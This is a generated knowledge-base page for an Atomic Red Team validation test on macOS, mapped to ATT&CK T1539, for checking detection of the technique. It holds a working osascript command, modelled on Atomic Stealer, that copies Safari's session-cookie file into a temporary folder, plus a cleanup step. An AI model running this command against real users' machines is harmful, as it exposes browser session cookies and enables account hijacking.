---
atomic_guid: "e57ba07b-3a33-40cd-a892-748273b9b49a"
title: "Copy Safari BinaryCookies files using AppleScript"
framework: "atomic"
generated: "true"
attack_technique_id: "T1539"
attack_technique_name: "Steal Web Session Cookie"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1539/T1539.yaml"
build_date: "2026-04-27 19:12:27"
executor: "sh"
aliases:
  - "e57ba07b-3a33-40cd-a892-748273b9b49a"
  - "Copy Safari BinaryCookies files using AppleScript"
platforms:
  - "macos"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

This command will copy Safari BinaryCookies files using AppleScript as seen in Atomic Stealer.

## ATT&CK Mapping

- [[kb/attack/techniques/T1539-steal_web_session_cookie|T1539: Steal Web Session Cookie]]

## Input Arguments

### destination_path

- description: Specify the path to copy the BinaryCookies file into.
- type: path
- default: /private/tmp

## Executor

- elevation_required: False
- name: sh

### Command

```bash
osascript -e 'tell application "Finder"' -e 'set destinationFolderPath to POSIX file "#{destination_path}"' -e 'set safariFolder to ((path to library folder from user domain as text) & "Containers:com.apple.Safari:Data:Library:Cookies:")' -e 'duplicate file "Cookies.binarycookies" of folder safariFolder to folder destinationFolderPath with replacing' -e 'end tell'
```

### Cleanup

```bash
rm "#{destination_path}/Cookies.binarycookies"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1539/T1539.yaml)
